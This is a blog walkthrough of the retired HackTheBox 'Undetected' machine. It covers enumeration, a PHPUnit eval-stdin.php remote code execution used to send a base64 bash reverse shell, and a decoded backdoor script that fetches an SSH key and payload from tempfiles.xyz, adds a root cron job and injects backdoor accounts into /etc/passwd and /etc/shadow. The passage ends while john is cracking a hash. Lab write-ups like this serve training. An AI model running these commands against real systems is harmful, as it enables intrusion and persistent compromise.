<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Undetected -- HTB walkthrough ::
        Werz — CyberSecurity
      </title>
    
    <head>
  
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
}
</script>



<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="The official box page on HTB #  The writeup: #  System Scan | IP: 10.10.11.146 #  let&amp;rsquo;s add the ip to to the /etc/hosts file and name it undetected.htb
 echo &#39;10.10.11.146 undetected.htb &#39; &amp;gt;&amp;gt; /etc/hosts
 startup nmap scan | -sC for the default set of scripts. | -sV for Enables version detection. | -T4 for sending the traffic fast.
 nmap -sC -sV -T4 10.10.11.146"
/>
<meta name="twitter:card" content="https://werz.is-a.dev/img/og_icon.png">
<meta name="og:site_name" content="Werz Portfolio | Cybersecurity content | CTF writeup | CTF walkthrough ">
<meta name="twitter:image:alt" content="Werz">
<meta
  name="keywords"
  content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://werz.info/blog/19/02/2022/undetected/" />
<meta content="Portfolio - Cybersecurity Posts - CTF" property="og:description" />
<meta content="https://werz.is-a.dev/" property="og:url" />
<meta property="og:image" content="https://werz.is-a.dev/img/og_icon.png">
<meta property="fb:app_id" content="your_app_id" />
<meta name="twitter:site" content="@werz0xff">
<meta content="Werz Portfolio | Cybersecurity content" property="og:title" />





<link rel="stylesheet" href="https://werz.info/blog/assets/style.css" />

<link rel="stylesheet" href="https://werz.info/blog/style.css" />


<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png%20%7c%20absURL">
<link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="img//android-chrome-192x192.png">
<link rel="manifest" href="img/site.webmanifest">
<link rel="mask-icon" href="img/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">


<link href="https://werz.info/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://werz.info/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Undetected -- HTB walkthrough"/>
<meta name="twitter:description" content="Undetected is a medium ranked linux box"/>



<meta property="og:title" content="Undetected -- HTB walkthrough" />
<meta property="og:description" content="Undetected is a medium ranked linux box" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://werz.info/blog/19/02/2022/undetected/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-19T06:24:55+13:00" />
<meta property="article:modified_time" content="2022-02-19T06:24:55+13:00" /><meta property="og:site_name" content="Werz" />






</head>
  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="https://werz.is-a.dev/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >werz@blog:~$</span
    >
    <span class="logo__cursor"></span>
  
</a>
    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="../../../../blog/archive">./archive</a></li>
        
      
        
          <li><a href="../../../../blog/posts">./articles</a></li>
        
      
        
          <li><a href="../../../../blog/about">./whoami</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="../../../../blog/archive">./archive</a></li>
      
    
      
        <li><a href="../../../../blog/posts">./articles</a></li>
      
    
      
        <li><a href="../../../../blog/about">./whoami</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Undetected &ndash; HTB walkthrough</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2022-02-19
        </span>

        
          
        
      

      
        <span class="post-author"
          >— Written by 0xWerz</span
        >


      
        <span class="post-read-time"
          >— 9 min read</span
        >
      
    </div>

    
      <span class="post-tags">
        
          <a href="https://werz.info/blog/tags/htb/">#htb</a>&nbsp;
        
          <a href="https://werz.info/blog/tags/linux/">#linux</a>&nbsp;
        
          <a href="https://werz.info/blog/tags/medium/">#medium</a>&nbsp;
        
          <a href="https://werz.info/blog/tags/retired/">#retired</a>&nbsp;
        
      </span>
    

    

    <div class="post-content">
      
      The official <h3 id="the-official-box-pagehttpsapphacktheboxcommachinesundetected-on-htb">
  <a href="https://app.hackthebox.com/machines/Undetected" target="_blank">box page</a>
 on HTB
  <a href="#the-official-box-pagehttpsapphacktheboxcommachinesundetected-on-htb" class="h-anchor" aria-hidden="true">#</a>
</h3>
<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/undetected/img/undetected.png" style="border-radius: 3%;" alt="">
<h3 id="the-writeup">
  The writeup:
  <a href="#the-writeup" class="h-anchor" aria-hidden="true">#</a>
</h3>
<h4 id="system-scan--ip-101011146">
  System Scan | <strong>IP: 10.10.11.146</strong>
  <a href="#system-scan--ip-101011146" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>let&rsquo;s add the ip to to the <code>/etc/hosts</code> file and name it <code>undetected.htb</code></p>
<blockquote>
<p><code>echo '10.10.11.146    undetected.htb ' &gt;&gt; /etc/hosts</code></p>
</blockquote>
<p>startup nmap scan | <strong>-sC for the default set of scripts</strong>. | <strong>-sV for Enables version detection</strong>. | <strong>-T4 for sending the traffic fast</strong>.</p>
<blockquote>
<p><code>nmap -sC -sV -T4 10.10.11.146</code></p>
</blockquote>
<pre tabindex="0"><code>werz@ctf01:~/ctf/htb/undetected$ nmap -sC -sV -T4 10.10.11.146 2&gt;/dev/null
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-06 02:41 +01
Nmap scan report for 10.10.11.146
Host is up (0.29s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Diana's Jewelry

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.26 seconds
</code></pre><h2 id="open-ports">
  Open Ports
  <a href="#open-ports" class="h-anchor" aria-hidden="true">#</a>
</h2>
<table>
<thead>
<tr>
<th>Ports</th>
<th>Service</th>
<th>Takeaways</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td>SSH</td>
<td>OpenSSH 8.2 (protocol 2.0)</td>
</tr>
<tr>
<td>80</td>
<td>HTTP</td>
<td>Apache httpd 2.4.41</td>
</tr>
</tbody>
</table>
<h4 id="enumeration--web-page">
  Enumeration | Web page
  <a href="#enumeration--web-page" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>after a while we&rsquo;ll see the store subdomain <code>store.djewelry.htb</code> in the page header href links. add it the hosts file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#39;10.10.11.146    store.djewelry.htb &#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>fire up gobuster may we&rsquo;ll get some interesting endpoints</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://store.djewelry.htb/ -w ~/opt/seclists/SecLists/Discovery/Web-Content/raft-small-words.txt
</code></pre></div><p>we see the vendor <code>/vendor</code> endpoint, seems to have interesting stuff, including <code>/vendor/composer/installed.json</code>, which could give information about what plugins are in use. composer is a PHP package management system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@Arch:~/ctf/htb/undetected$ curl -s <span style="color:#e6db74">&#39;http://store.djewelry.htb/vendor/composer/installed.json&#39;</span> | jq -c <span style="color:#e6db74">&#39;.[] | [.name, .version]&#39;</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;doctrine/instantiator&#34;</span>,<span style="color:#e6db74">&#34;1.4.0&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;myclabs/deep-copy&#34;</span>,<span style="color:#e6db74">&#34;1.10.2&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpdocumentor/reflection-common&#34;</span>,<span style="color:#e6db74">&#34;2.2.0&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpdocumentor/reflection-docblock&#34;</span>,<span style="color:#e6db74">&#34;5.2.2&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpdocumentor/type-resolver&#34;</span>,<span style="color:#e6db74">&#34;1.4.0&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpspec/prophecy&#34;</span>,<span style="color:#e6db74">&#34;v1.10.3&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpunit/php-code-coverage&#34;</span>,<span style="color:#e6db74">&#34;4.0.8&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpunit/php-file-iterator&#34;</span>,<span style="color:#e6db74">&#34;1.4.5&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpunit/php-text-template&#34;</span>,<span style="color:#e6db74">&#34;1.2.1&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpunit/php-timer&#34;</span>,<span style="color:#e6db74">&#34;1.0.9&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpunit/php-token-stream&#34;</span>,<span style="color:#e6db74">&#34;2.0.2&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpunit/phpunit&#34;</span>,<span style="color:#e6db74">&#34;5.6.2&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;phpunit/phpunit-mock-objects&#34;</span>,<span style="color:#e6db74">&#34;3.4.4&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/code-unit-reverse-lookup&#34;</span>,<span style="color:#e6db74">&#34;1.0.2&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/comparator&#34;</span>,<span style="color:#e6db74">&#34;1.2.4&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/diff&#34;</span>,<span style="color:#e6db74">&#34;1.4.3&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/environment&#34;</span>,<span style="color:#e6db74">&#34;2.0.0&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/exporter&#34;</span>,<span style="color:#e6db74">&#34;1.2.2&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/global-state&#34;</span>,<span style="color:#e6db74">&#34;1.1.1&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/object-enumerator&#34;</span>,<span style="color:#e6db74">&#34;1.0.0&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/recursion-context&#34;</span>,<span style="color:#e6db74">&#34;1.0.5&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/resource-operations&#34;</span>,<span style="color:#e6db74">&#34;1.0.0&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sebastian/version&#34;</span>,<span style="color:#e6db74">&#34;2.0.1&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;symfony/polyfill-ctype&#34;</span>,<span style="color:#e6db74">&#34;v1.23.0&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;symfony/yaml&#34;</span>,<span style="color:#e6db74">&#34;v3.4.47&#34;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;webmozart/assert&#34;</span>,<span style="color:#e6db74">&#34;1.10.0&#34;</span><span style="color:#f92672">]</span>
</code></pre></div><h2 id="shell-as-www-data">
  Shell as www-data
  <a href="#shell-as-www-data" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>moving throught the list to find some exploits with google, ends up with the <code>phpunit</code> that have a <a href="https://www.exploit-db.com/exploits/5070" target="_blank">exploit-db</a>
 RCE, that aims to the <code>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code> that also exists with the box. this probably passing a php code to eval that execute it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch undetected<span style="color:#f92672">]</span>$ curl <span style="color:#e6db74">&#39;http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&#39;</span> -d <span style="color:#e6db74">&#39;&lt;?php echo hello ?&gt;&#39;</span>
hello
</code></pre></div><p>it works well! let&rsquo;s get a shell then.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch undetected<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.9/9001 0&gt;&amp;1&#34;</span> | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzkwMDEgMD4mMQo<span style="color:#f92672">=</span>

<span style="color:#f92672">[</span>werz@Arch undetected<span style="color:#f92672">]</span>$ export rev<span style="color:#f92672">=</span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzkwMDEgMD4mMQo<span style="color:#f92672">=</span>

<span style="color:#f92672">[</span>werz@Arch undetected<span style="color:#f92672">]</span>$ curl <span style="color:#e6db74">&#39;http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&#39;</span> -d <span style="color:#e6db74">&#39;&lt;?php system(&#34;echo &#39;</span><span style="color:#e6db74">&#34;</span>$rev<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#39;|base64 -d |bash&#34;); ?&gt;&#39;</span>
</code></pre></div><p>for the listener side we got a hit!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@Arch undetected<span style="color:#f92672">]</span>$ nc -lvnp <span style="color:#ae81ff">9001</span>
Connection from 10.10.11.146:48018
bash: cannot set terminal process group <span style="color:#f92672">(</span>895<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$
</code></pre></div><p>i&rsquo;ll upgrade the shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>

www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ export TERM<span style="color:#f92672">=</span>xterm
</code></pre></div><h2 id="shell-as-steven--pe">
  Shell as steven | PE
  <a href="#shell-as-steven--pe" class="h-anchor" aria-hidden="true">#</a>
</h2>
<h3 id="enumeration">
  Enumeration
  <a href="#enumeration" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>after some manual enumeration we&rsquo;ve found the <code>/var/backups</code> directory that has an unusual ELF file in it <code>info</code> , Everything else there is owned by root except it that owned by <code> www-data</code> so we have access to it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@production:/var/backups$ ls -l
total <span style="color:#ae81ff">64</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root     root     <span style="color:#ae81ff">34011</span> Feb  <span style="color:#ae81ff">8</span> 19:05 apt.extended_states.0
-r-x------ <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">27296</span> May <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2021</span> info

www-data@production:/var/backups$ file info
info: ELF 64-bit LSB shared object, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>0dc004db7476356e9ed477835e583c68f1d2493a, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, not stripped
</code></pre></div><p>executing it:</p>
<pre tabindex="0"><code>www-data@production:/var/backups$ ./info
[.] starting
[.] namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
[-] substring 'ffff' not found in dmesg
</code></pre><p>it&rsquo;s probally a failed kernel exploit</p>
<p>I’ll copy the file into a website endpoint <code>/var/www/main/images/</code> to analyse it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@production:/var/backups$ cp info /var/www/main
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch user<span style="color:#f92672">]</span>$ curl undetected.htb/info -O info
</code></pre></div><p>if we run the <code>strings</code> command for it dumps some interesting stuff,<code>/bin/bash</code> after that some hexadecimal</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch user<span style="color:#f92672">]</span>$ strings info 
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> substring <span style="color:#e6db74">&#39;%s&#39;</span> not found in dmesg
ffff
/bin/bash
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fork<span style="color:#f92672">()</span>
/etc/shadow
<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span> checking <span style="color:#66d9ef">if</span> we got root
</code></pre></div><p>if we convert the hex to text, we see a bash script <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex%28%27Auto%27%29&amp;input=Nzc2NzY1NzQyMDc0NjU2ZDcwNjY2OTZjNjU3MzJlNzg3OTdhMmY2MTc1NzQ2ODZmNzI2OTdhNjU2NDVmNmI2NTc5NzMyMDJkNGYyMDJmNzI2ZjZmNzQyZjJlNzM3MzY4MmY2MTc1NzQ2ODZmNzI2OTdhNjU2NDVmNmI2NTc5NzMzYjIwNzc2NzY1NzQyMDc0NjU2ZDcwNjY2OTZjNjU3MzJlNzg3OTdhMmYyZTZkNjE2OTZlMjAyZDRmMjAyZjc2NjE3MjJmNmM2OTYyMmYyZTZkNjE2OTZlM2IyMDYzNjg2ZDZmNjQyMDM3MzUzNTIwMmY3NjYxNzIyZjZjNjk2MjJmMmU2ZDYxNjk2ZTNiMjA2NTYzNjg2ZjIwMjIyYTIwMzMyMDJhMjAyYTIwMmEyMDcyNmY2Zjc0MjAyZjc2NjE3MjJmNmM2OTYyMmYyZTZkNjE2OTZlMjIyMDNlM2UyMDJmNjU3NDYzMmY2MzcyNmY2ZTc0NjE2MjNiMjA2MTc3NmIyMDJkNDYyMjNhMjIyMDI3MjQzNzIwM2QzZDIwMjIyZjYyNjk2ZTJmNjI2MTczNjgyMjIwMjYyNjIwMjQzMzIwM2UzZDIwMzEzMDMwMzAyMDdiNzM3OTczNzQ2NTZkMjgyMjY1NjM2ODZmMjAyMjI0MzEyMjMxM2E1YzI0MzY1YzI0N2E1MzM3Nzk2YjQ4NjY0NjRkNjczMzYxNTk2ODc0MzQ1YzI0MzE0OTU1NzI2ODVhNjE2ZTUyNzU0NDVhNjg2NjMxNmY0OTY0NmU2ZjRmNzY1ODZmNmY2YzRiNmQ2Yzc3NjI2YjY1Njc0MjU4NmIyZTU2NzQ0NzY3MzczODY1NGMzNzU3NDI0ZDM2NGY3MjRlNzQ0NzYyNWE3ODRiNDI3NDUwNzUzODU1NjY2ZDM5Njg0ZDMwNTIyZjQyNGM2NDQxNDM2ZjUxMzA1NDM5NmUyZjNhMzEzODM4MzEzMzNhMzAzYTM5MzkzOTM5MzkzYTM3M2EzYTNhMjAzZTNlMjAyZjY1NzQ2MzJmNzM2ODYxNjQ2Zjc3MjIyOTdkMjcyMDJmNjU3NDYzMmY3MDYxNzM3Mzc3NjQzYjIwNjE3NzZiMjAyZDQ2MjIzYTIyMjAyNzI0MzcyMDNkM2QyMDIyMmY2MjY5NmUyZjYyNjE3MzY4MjIyMDI2MjYyMDI0MzMyMDNlM2QyMDMxMzAzMDMwMjA3YjczNzk3Mzc0NjU2ZDI4MjI2NTYzNjg2ZjIwMjIyNDMxMjIyMDIyMjQzMzIyMjAyMjI0MzYyMjIwMjIyNDM3MjIyMDNlMjA3NTczNjU3MjczMmU3NDc4NzQyMjI5N2QyNzIwMmY2NTc0NjMyZjcwNjE3MzczNzc2NDNiMjA3NzY4Njk2YzY1MjA3MjY1NjE2NDIwMmQ3MjIwNzU3MzY1NzIyMDY3NzI2Zjc1NzAyMDY4NmY2ZDY1MjA3MzY4NjU2YzZjMjA1ZjNiMjA2NDZmMjA2NTYzNjg2ZjIwMjIyNDc1NzM2NTcyMjIzMTIyM2E3ODNhMjQ2NzcyNmY3NTcwM2EyNDY3NzI2Zjc1NzAzYTJjMmMyYzNhMjQ2ODZmNmQ2NTNhMjQ3MzY4NjU2YzZjMjIyMDNlM2UyMDJmNjU3NDYzMmY3MDYxNzM3Mzc3NjQzYjIwNjQ2ZjZlNjUyMDNjMjA3NTczNjU3MjczMmU3NDc4NzQzYjIwNzI2ZDIwNzU3MzY1NzI3MzJlNzQ3ODc0M2I" target="_blank">gchq</a>
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod <span style="color:#ae81ff">755</span> /var/lib/.main; echo <span style="color:#e6db74">&#34;* 3 * * * root /var/lib/.main&#34;</span> &gt;&gt; /etc/crontab; awk -F<span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#e6db74">&#39;$7 == &#34;/bin/bash&#34; &amp;&amp; $3 &gt;= 1000 {system(&#34;echo &#34;$1&#34;1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow&#34;)}&#39;</span> /etc/passwd; awk -F<span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#e6db74">&#39;$7 == &#34;/bin/bash&#34; &amp;&amp; $3 &gt;= 1000 {system(&#34;echo &#34;$1&#34; &#34;$3&#34; &#34;$6&#34; &#34;$7&#34; &gt; users.txt&#34;)}&#39;</span> /etc/passwd; <span style="color:#66d9ef">while</span> read -r user group home shell _; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span>1<span style="color:#e6db74">&#34;:x:</span>$group<span style="color:#e6db74">:</span>$group<span style="color:#e6db74">:,,,:</span>$home<span style="color:#e6db74">:</span>$shell<span style="color:#e6db74">&#34;</span> &gt;&gt; /etc/passwd; <span style="color:#66d9ef">done</span> &lt; users.txt; rm users.txt;
</code></pre></div><p>it seems that it have a scenario of a already hacked machine, it makes sense if we checked the users available.</p>
<pre tabindex="0"><code>steven@production:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
</code></pre><p>it a common attack way.</p>
<p>let&rsquo;s try to crack the hash given in that bash script, i&rsquo;m using <a href="https://github.com/openwall/john" target="_blank">john</a>
 with the rockyou word list.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch user<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#39;$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/&#39;</span> &gt; hash
<span style="color:#f92672">[</span>werz@Arch user<span style="color:#f92672">]</span>$ john --wordlist<span style="color:#f92672">=</span>/home/werz/opt/rockyou.txt hash

Warning: detected hash type <span style="color:#e6db74">&#34;sha512crypt&#34;</span>, but the string is also recognized as <span style="color:#e6db74">&#34;sha512crypt-opencl&#34;</span>
Use the <span style="color:#e6db74">&#34;--format=sha512crypt-opencl&#34;</span> option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>sha512crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $6$ <span style="color:#f92672">[</span>SHA512 128/128 AVX 2x<span style="color:#f92672">])</span>
